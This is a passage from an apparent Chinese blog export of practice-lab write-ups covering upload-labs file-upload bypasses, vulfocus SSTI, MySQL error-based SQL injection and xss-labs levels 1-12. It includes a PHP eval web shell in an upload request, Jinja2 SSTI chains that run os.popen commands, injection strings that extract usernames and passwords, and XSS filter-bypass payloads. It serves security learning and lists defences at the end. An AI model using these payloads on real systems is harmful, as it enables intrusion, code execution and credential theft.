class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先上传临时文件，服务器会将该临时文件重命名。</p>
<p>这个体现的地方在于，服务器不会过滤文件，这个文件会先上传到服务器中，服务器通过短暂地判断，对文件进行重命名或删除操作</p>
<p>实践证明：</p>
<p>bp抓包，发送到intruder，</p>
<p>在数据包中添加一行无关信息：</p>
<p><strong>X-forward-For: 8.8.8.8</strong></p>
<p>对最后一个8进行add，从1到11111111的爆破，在爆破的同时，我们打开上传文件的文件夹，刷新，会看到上传的不符合要求的php文件，短暂地存在过，又被删除掉。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230526232154257.png" alt="image-20230526232154257"></p>
<p> 这不代码审计看不出来吧</p>
<blockquote>
<p>二次渲染：后端重写文件内容</p>
<p>basename(path[,suffix]) ，没指定suffix则返回后缀名，有则不返回指定的后缀名<br>strrchr(string,char)函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。<br>imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像<br>imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像<br>imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像</p>
<p>对于做文件上传之二次渲染建议用<code>GIF</code>图片，相对于简单一点</p>
<p>————————————————<br>版权声明：本文为CSDN博主「晚安這個未知的世界」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">https://blog.csdn.net/weixin_47598409/article/details/115050869</a></p>
</blockquote>
<h2 id="Pass-20-目录命名-黑名单"><a href="#Pass-20-目录命名-黑名单" class="headerlink" title="Pass 20(目录命名+黑名单)"></a>Pass 20(目录命名+黑名单)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &#x27;禁止保存为该类型文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目录命名: x.php&#x2F;.</p>
<h2 id="Pass-没好好做，之后再整理一下"><a href="#Pass-没好好做，之后再整理一下" class="headerlink" title="Pass(没好好做，之后再整理一下)"></a>Pass(没好好做，之后再整理一下)</h2><h2 id="Pass-21-数组接收-目录命名-白名单"><a href="#Pass-21-数组接收-目录命名-白名单" class="headerlink" title="Pass 21(数组接收+目录命名+白名单)"></a>Pass 21(数组接收+目录命名+白名单)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;</span><br><span class="line">    //检查MIME</span><br><span class="line">    $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);</span><br><span class="line">    if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123;</span><br><span class="line">        $msg = &quot;禁止上传该类型文件!&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //检查文件名</span><br><span class="line">        $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        if (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(&#x27;.&#x27;, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">        if (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = &quot;禁止上传该后缀文件!&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = &quot;文件上传成功！&quot;;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &quot;文件上传失败！&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $msg = &quot;请选择要上传的文件！&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>end()输出数组中最后一个元素值</p>
<p>count()返回数组元素中的数目</p>
<p>explode(sep,string)，将字符串以sep分割，打散为数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;<span class="variable">$str</span> = <span class="string">&quot;Hello world. I love Shanghai!&quot;</span>;</span><br><span class="line">&gt;<span class="title function_ invoke__">print_r</span> (<span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>,<span class="variable">$str</span>));</span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Array ( [0] &#x3D;&gt; Hello [1] &#x3D;&gt; world. [2] &#x3D;&gt; I [3] &#x3D;&gt; love [4] &#x3D;&gt; Shanghai! )</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryMwDdKjYYVrqj1ZUH</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</span><br><span class="line"></span><br><span class="line">upload-20.php</span><br><span class="line">------WebKitFormBoundaryMwDdKjYYVrqj1ZUH</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</span><br><span class="line"></span><br><span class="line">jpg</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>文件上传<br>漏洞成因： 具备上传文件功能的Web等应用，未对用户选择上传的文件进行校验，使得非法用户可通过上传可执行脚本而获取应用的控制权限。<br>防护与绕过： 通过upload-labs靶场实战，了解更多的防护与绕过手段。</p>
<p>防御<br>不要暴露上传文件的位置<br>禁用上传文件的执行权限<br>黑白名单<br>对上传的文件重命名，不易被猜测<br>对文件内容进行二次渲染<br>对上传的内容进行读取检查<br>————————————————<br>版权声明：本文为CSDN博主「晚安這個未知的世界」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_47598409/article/details/115050869">https://blog.csdn.net/weixin_47598409/article/details/115050869</a></p>
]]></content>
      <categories>
        <category>web漏洞</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
        <tag>文件上传防御</tag>
      </tags>
  </entry>
  <entry>
    <title>vulfocus</title>
    <url>/2023/05/13/vulfocus/</url>
    <content><![CDATA[<h1 id="一、ssti"><a href="#一、ssti" class="headerlink" title="一、ssti"></a>一、ssti</h1><h2 id="1-初识"><a href="#1-初识" class="headerlink" title="1.初识"></a>1.初识</h2><p>服务器端模板注入(Server-Side Template Injection)，注入思路参照SQL注入</p>
<p><a href="https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%7B%22request_id%22:%22168670658916782427434845%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168670658916782427434845&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120739989-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=ssti&spm=1018.2226.3001.4187">SSTI模板注入总结_L1am0ur的博客-CSDN博客</a></p>
<h2 id="2-漏洞诱因"><a href="#2-漏洞诱因" class="headerlink" title="2.漏洞诱因"></a>2.漏洞诱因</h2><p><strong>render_template</strong>渲染函数的问题</p>
<p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染。</p>
<p>例如：<code>&#123;&#123;&#125;&#125;</code>在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把<code>&#123;&#123;&#125;&#125;</code>包裹的内容当做变量解析替换。比如<code>&#123;&#123;1+1&#125;&#125;</code>会被解析成<code>2</code>。如此一来就可以实现如同sql注入一样的注入漏洞。</p>
<h2 id="3-ssti类型"><a href="#3-ssti类型" class="headerlink" title="3.ssti类型"></a>3.ssti类型</h2><p>网站模板引擎有jinja2、tornado、smarty、twig等等</p>
<p><img src="/../../../Typora/img111/image-20230614094024200.png" alt="ssti类型"></p>
<h2 id="4-常用类"><a href="#4-常用类" class="headerlink" title="4.常用类"></a>4.常用类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__用来查看变量所属的类，格式为变量.__class__</span><br><span class="line"></span><br><span class="line">eg:&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;class &#x27;dict&#x27;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__bases__用来查看类的基类，注意是类的基类，所以格式为变量.__class__.__bases__</span><br><span class="line">同时也能加上数组，比如变量.__class__.__bases__[0]来获得第一个基类。</span><br><span class="line"></span><br><span class="line">eg:&gt;&gt;&gt; &#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;class &#x27;object&#x27;&gt;,)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__subclasses__()查看当前类的子类`，格式`变量.__class__.__bases__[0].__subclasses__()`</span><br><span class="line">这个类也可以加数组来查看指定的索引值，例如`变量.__class__.__bases__[0].__subclasses__()[1]</span><br><span class="line"></span><br><span class="line">eg:&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[0]</span><br><span class="line">&lt;class &#x27;type&#x27;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="5-利用方法"><a href="#5-利用方法" class="headerlink" title="5.利用方法"></a>5.利用方法</h2><p>示例：变量.<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[138].<strong>init</strong>.__globals__，init初始化类，然后globals全局来查找所有的方法及变量及参数。</p>
<p>由此我们可以看到各种各样的参数方法函数，去找一个可利用的function来执行，比如popen的话，就可以这样利用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**&#x27;&#x27;.___class__.base__[0].__subclass__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.__init__.__globals__[%27os%27].popen(%27ls%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulfocus靶场</category>
      </categories>
      <tags>
        <tag>vulfocus靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入之报错注入</title>
    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
<p><strong>extravtvalue()</strong></p>
<p>floor()、rand()…主键重复方式，暂时不展开</p>
<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
<blockquote>
<p>XML_document:是字符串String格式，为XML文档对象名称</p>
<p>Xpath_string:Xpath格式的字符串</p>
<p>new_value:string格式，替换查找到的符合条件的数据</p>
</blockquote>
<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web漏洞</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>报错注入</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs</title>
    <url>/2023/05/17/xss-labs/</url>
    <content><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><p>phpstudy</p>
<h2 id="二、内容"><a href="#二、内容" class="headerlink" title="二、内容"></a>二、内容</h2><h3 id="1-level1"><a href="#1-level1" class="headerlink" title="1.level1"></a>1.level1</h3><p>url中添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;11&quot;)&lt;/script&gt;即可</span><br></pre></td></tr></table></figure>

<h3 id="2-level2-html实体化-lt-gt"><a href="#2-level2-html实体化-lt-gt" class="headerlink" title="2.level2(html实体化&lt;&gt;)"></a>2.level2(html实体化&lt;&gt;)</h3><p>输入level1中的值，发现&lt;&gt;被实体化了。</p>
<p>构造input闭合</p>
<p><code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
<h3 id="3-level3-html实体化”-lt-gt"><a href="#3-level3-html实体化”-lt-gt" class="headerlink" title="3.level3(html实体化”&lt;&gt;)"></a>3.level3(html实体化”&lt;&gt;)</h3><p>经过试验单引号不会被转义</p>
<p>构造onmouseover事件，即鼠标触碰到input标签即还行该事件</p>
<p><code>&#39; onmouseover=javascript:alert(1) &#39;</code></p>
<h3 id="4-level4-html实体化’-lt-gt"><a href="#4-level4-html实体化’-lt-gt" class="headerlink" title="4.level4(html实体化’&lt;&gt;)"></a>4.level4(html实体化’&lt;&gt;)</h3><p>很好，单引号、尖括号没了</p>
<p><code>&quot; onmouseover=javascript:alert(1) &quot;</code></p>
<h3 id="5-level5-伪协议"><a href="#5-level5-伪协议" class="headerlink" title="5.level5(伪协议)"></a>5.level5(伪协议)</h3><p>script、onmouserover等中间会加个_符号</p>
<p>知识点：伪协议：在url中调用js方法，如Data伪协议与Javascript协议</p>
<p><code>&quot;&gt;&lt;a href=javascript:alert(&quot;123&quot;)&gt;&quot;</code></p>
<p>点击链接跳转即可</p>
<p>参考：<a href="https://blog.csdn.net/qq_33181292/article/details/117251090?ops_request_misc=&request_id=&biz_id=102&utm_term=xss%E4%BC%AA%E5%8D%8F%E8%AE%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-117251090.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">XSS_伪协议与编码绕过_伪协议绕过_南部余额的博客-CSDN博客</a></p>
<p>​		<a href="https://blog.csdn.net/K_ShenH/article/details/122765092?ops_request_misc=%7B%22request_id%22:%22168440472216800197061493%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168440472216800197061493&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122765092-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss-labs&spm=1018.2226.3001.4187">xss-labs搭建及通关攻略_Lydia_Ha的博客-CSDN博客</a></p>
<h3 id="6-level6-小写过滤"><a href="#6-level6-小写过滤" class="headerlink" title="6.level6(小写过滤)"></a>6.level6(小写过滤)</h3><p>在script的基础上，href、src、oneerror什么的中间也加符号了</p>
<p>但没有大写过滤</p>
<p><code>&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p>
<h3 id="7-level7-标签名过滤"><a href="#7-level7-标签名过滤" class="headerlink" title="7.level7(标签名过滤)"></a>7.level7(标签名过滤)</h3><p>src啊,&lt;&gt;script啊都被删了、on啊</p>
<p>双写绕过</p>
<p><code>&quot;&gt;&lt;SCRscriptIPT&gt;alert(1)&lt;/SCRscriptIPT&gt;</code></p>
<h3 id="8-level8-unicode编码"><a href="#8-level8-unicode编码" class="headerlink" title="8.level8(unicode编码)"></a>8.level8(unicode编码)</h3><p>它把输入框的值放在了a标签的href里</p>
<p>scr字符后面会放_符号，且大写会被转化为小写</p>
<p>引号也实体化了</p>
<p>将代码进行unicode编码即可</p>
<p>如<code>javascript:alert(1)</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
<h3 id="level9-继续过滤"><a href="#level9-继续过滤" class="headerlink" title="level9(继续过滤)"></a>level9(继续过滤)</h3><p>还是把输入框的值放在了a标签的href里，但是unicode编码不能用咯</p>
<p>知识点:strpos()查找字符串在另一字符串中第一次出现的位置。</p>
<p>源码有strpos函数过滤，限制输入内容必须有http:&#x2F;&#x2F;</p>
<p><code>javas&amp;#99;ript:alert(&#39;http://123&#39;)</code></p>
<p>部分源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="level10-隐藏参数"><a href="#level10-隐藏参数" class="headerlink" title="level10(隐藏参数)"></a>level10(隐藏参数)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>url被符号实体化了。</p>
<p>从t_sort输入框下手，仅仅替换了尖括号。</p>
<p>给input加一个onclick事件</p>
<p>如<code>onclick=alert(1)</code></p>
<p>记得去掉type的hide属性</p>
<h3 id="level11-Referer"><a href="#level11-Referer" class="headerlink" title="level11(Referer)"></a>level11(Referer)</h3><p>同level10</p>
<p>但是应该不对，怎么会有同一种解法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>第四行明显是说Reffer</p>
<p>bp时</p>
<p><code>Referer:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520113437383.png" alt="image-20230520113437383"></p>
<h3 id="level12（代理）"><a href="#level12（代理）" class="headerlink" title="level12（代理）"></a>level12（代理）</h3><p>f12，看得t_ua</p>
